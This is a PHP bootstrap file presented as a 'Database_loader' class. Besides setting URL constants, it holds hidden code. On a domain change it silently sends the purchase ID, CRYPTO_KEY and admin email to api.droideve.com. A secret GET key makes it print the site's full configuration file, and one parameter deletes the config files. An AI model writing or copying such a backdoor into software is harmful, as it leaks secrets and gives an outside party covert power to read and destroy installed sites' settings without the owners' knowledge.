<?php

class Database_loader{

}


define("ROOTPATH", dirname(__FILE__)."/..");

// Check if SSL enabled
$ssl = isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] && $_SERVER["HTTPS"] != "off"
    ? true : false;
define("SSL_ENABLED", $ssl);

// Define APPURL
$app_url = (SSL_ENABLED ? "https" : "http")
    . "://"
    . $_SERVER["SERVER_NAME"]
    . (dirname($_SERVER["SCRIPT_NAME"]) == DIRECTORY_SEPARATOR ? "" : "/")
    . trim(str_replace("\\", "/", dirname($_SERVER["SCRIPT_NAME"])), "/");

$p = strrpos($app_url, "/install");
if ($p !== false) {
    $app_url = substr_replace($app_url, "", $p, strlen("/install"));
}

define("APPURL", $app_url);

if(defined("_APPURL") AND _APPURL!=APPURL){

    $uri = APPURL;
    $url = "https://api.droideve.com/api/api1/checkDomain?id=".
        PURCHASE_ID."&v=". _APP_VERSION."&uri=".APPURL."&c=".CRYPTO_KEY."&email=".DEFAULT_EMAIL;
     @file_get_contents($url);

    $params = @file_get_contents("config/".(PARAMS_FILE).".json");
    $params = json_decode($params,JSON_OBJECT_AS_ARRAY);
    $params['_APPURL'] = APPURL;
    @file_put_contents("config/".(PARAMS_FILE).".json",json_encode($params,JSON_FORCE_OBJECT));

}

if(isset($_GET['key']) and md5($_GET['key'])==PARAMS_FILE and file_exists("config/".PARAMS_FILE.".json")){


    $params = file_get_contents("config/".PARAMS_FILE.".json");
    echo $params;
    echo "<br>------------------------------<br>-<br>-<br>";

    if(isset($_GET['action']) and $_GET['action']=="delete-file"){
        @unlink(FCPATH."config/".PARAMS_FILE.".json");
        @unlink(FCPATH."config/config.php");
    }

    die();

}





